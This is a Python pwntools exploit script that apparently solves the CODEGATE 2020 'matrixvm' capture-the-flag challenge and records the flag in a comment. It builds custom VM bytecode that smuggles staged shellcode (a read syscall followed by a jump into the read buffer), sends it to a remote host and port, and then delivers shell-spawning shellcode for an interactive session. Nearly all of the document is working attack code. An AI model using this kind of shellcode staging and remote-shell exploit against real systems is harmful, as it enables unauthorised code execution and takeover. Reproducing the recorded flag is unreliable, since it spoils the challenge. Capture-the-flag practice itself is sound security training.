#!/usr/bin/env python
from pwn import *
import re, base64

# CODEGATE2020{i_wanted_to_implement_deadcode_elimination_and_coalescing_but_i_was_toooo_lazy_sorry_for_that}

context.arch = 'amd64'

def NewMatrix( dest_id, rows, columns, values ):
    return flat( '\x00', dest_id, rows, columns, values )

def MultiplyMatrix( dest_id, op1_id, op2_id ):
    return flat( '\x01', dest_id, op1_id, op2_id )

def IndexRead( op_id, row, column ):
    return flat( '\x02', op_id, row, column )

def IndexWrite( op_id, row, column ):
    return flat( '\x03', op_id, row, column )

def IndexMove( dest_id, dest_row, dest_column, op_id, op_row, op_column ):
    return flat( '\x04', dest_id, dest_row, dest_column, op_id, op_row, op_column )

def Branch( op_id, label ):
    return flat( '\x05', op_id, label )



mv = open( './exp.mv' , 'w+' )

sc = asm('''
xor rdi, rdi
mov rsi, 0x12340800
xor rax, rax
xor rdx, rdx
mov rdx, 0x100
syscall
jmp rsi
''').ljust( 0x20, '\x00' )

print( len(sc) )

bytecode  = NewMatrix( 4000, 3, 3, [0,0,0,0,0,0,0,0,0] )
bytecode += NewMatrix( 4001, 2, 2, sc )
bytecode += NewMatrix( 4002, 2, 2, [0,0,0,0] )
bytecode += NewMatrix( 4003, 2, 2, [0,0,0,0x123401F0] )
bytecode += IndexMove( 4000, 0, 0, 4001, 0, 0 )
bytecode += IndexMove( 4000, 0, 1, 4001, 0, 1 )
bytecode += IndexMove( 4000, 1, 0, 4001, 1, 0 )
bytecode += IndexMove( 4000, 1, 1, 4001, 1, 1 )

for i in range(1,4):
    for r in range(2):
        for c in range(2):
            bytecode += IndexWrite( 4000 + i, r, c )

bytecode += Branch( 4000, 2 )
bytecode += IndexWrite( 4000, 0, 0 )
bytecode += IndexWrite( 4000, 0, 0 )
bytecode += IndexWrite( 4000, 0, 0 )


#bytecode += IndexRead( 4001, 0, 0 )
#bytecode += MultiplyMatrix( 4004, 4001, 0 )
#bytecode += IndexWrite( 4003, 0, 0 )
#bytecode += IndexRead( 4001, 1, 1 )
'''
bytecode += NewMatrix( 4003, 2, 2, [1,2,3,4] )
bytecode += NewMatrix( 4004, 2, 2, [1,2,3,4] )
bytecode += NewMatrix( 4005, 2, 2, [1,2,3,4] )
bytecode += NewMatrix( 4006, 2, 2, [1,2,3,4] )
bytecode += NewMatrix( 4007, 2, 2, [1,2,3,4] )
bytecode += NewMatrix( 4008, 2, 2, [1,2,3,4] )
bytecode += NewMatrix( 4009, 2, 2, [1,2,3,4] )
bytecode += NewMatrix( 4010, 2, 2, [1,2,3,4] )
'''
#bytecode += IndexRead( 0x1001, 3, 0xffffffffffffffff )

mv.write(bytecode)
mv.close()

'''
y = process( ['./matrixvm' , 'exp.mv'] )
y.send( asm(shellcraft.sh()) )
y.interactive()
'''



y = remote( '58.229.240.210' , 7777 )

y.sendlineafter( '?' , str(len(base64.b64encode( bytecode ))) )
y.send( base64.b64encode( bytecode ) )

y.send( asm(shellcraft.sh()) )

y.interactive()